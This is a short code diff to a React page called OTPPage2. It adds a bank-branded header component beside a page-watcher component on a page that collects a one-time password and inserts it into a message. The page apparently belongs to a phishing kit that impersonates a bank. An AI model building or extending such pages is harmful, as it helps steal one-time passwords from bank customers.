@@ -1,5 +1,6 @@
 import { useState } from "react";
 import PageWatcher from "../components/pagewaters";
+import BankHeader from "../components/bankhead";
 
 export default function OTPPage2() {
   const [otp2, setOtp2] = useState("");
@@ -56,6 +57,7 @@ OTP: ${otp2}
   return (
     <>
       <PageWatcher />
+      <BankHeader/>
 
       {isLoading && (
         <div className="fixed inset-0 flex items-center justify-center bg-white z-50">
